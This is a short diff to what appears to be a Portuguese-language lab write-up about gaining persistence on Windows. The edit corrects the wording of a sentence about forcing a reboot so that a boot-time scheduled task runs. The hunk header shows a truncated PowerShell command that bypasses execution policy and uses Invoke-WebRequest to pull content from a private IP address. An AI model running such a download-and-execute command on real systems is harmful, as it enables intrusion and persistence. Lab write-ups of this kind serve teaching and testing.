@@ -251,7 +251,7 @@ powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://192.
 <p/>
 
 
-Como a tarefa era configurada para correr ao arrancar o sistema, pode-se esperar que a maquina a vitima inicie a máquina mas como tratasse de um laboratório forçou-se o reinício:
+Como a tarefa era configurada para correr ao arrancar o sistema, pode-se esperar que a vitima inicie a máquina mas, como tratasse de um laboratório forcei o reinício:
 
 ```powershell
 Restart-Computer -Force
